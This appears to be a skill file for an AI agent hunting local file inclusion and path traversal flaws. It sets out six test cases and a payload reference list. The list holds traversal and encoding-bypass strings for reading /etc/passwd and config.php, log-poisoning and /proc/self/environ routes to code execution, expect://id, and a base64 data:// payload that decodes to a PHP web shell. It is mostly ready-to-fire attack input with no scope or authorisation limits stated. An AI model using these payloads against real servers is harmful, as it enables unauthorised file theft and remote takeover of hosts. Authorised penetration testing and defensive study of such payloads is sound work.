# LFI / Path Traversal Hunting Skill — 6 Test Cases

> Load when: LFI, local file inclusion, path traversal, directory traversal.

## 186. Basic LFI (easy)
Test every file parameter with: `../../../etc/passwd`, `....//....//....//etc/passwd`, `%2e%2e%2f`. Report file content in response.

## 187. LFI with null byte (easy)
If PHP <5.3.4: `../../../etc/passwd%00`. Report null byte truncation.

## 188. LFI with encoding (medium)
Double URL encode: `%252e%252e%252f`, UTF-8 overlong: `%c0%ae%c0%ae/`, null bytes: `%00`.

## 189. LFI to RCE via log poisoning (hard)
Inject PHP code into User-Agent, then LFI `/var/log/apache2/access.log` to execute it.

## 190. LFI via /proc/self/environ (hard)
LFI `/proc/self/environ` if PHP running as CGI. Inject payload in User-Agent.

## 191. LFI via php://filter (medium)
Use `php://filter/convert.base64-encode/resource=config.php` to read source code.

---

## LFI Payload Reference
```
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
php://filter/convert.base64-encode/resource=config.php
php://input (POST body)
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
/proc/self/environ
/var/log/apache2/access.log
```
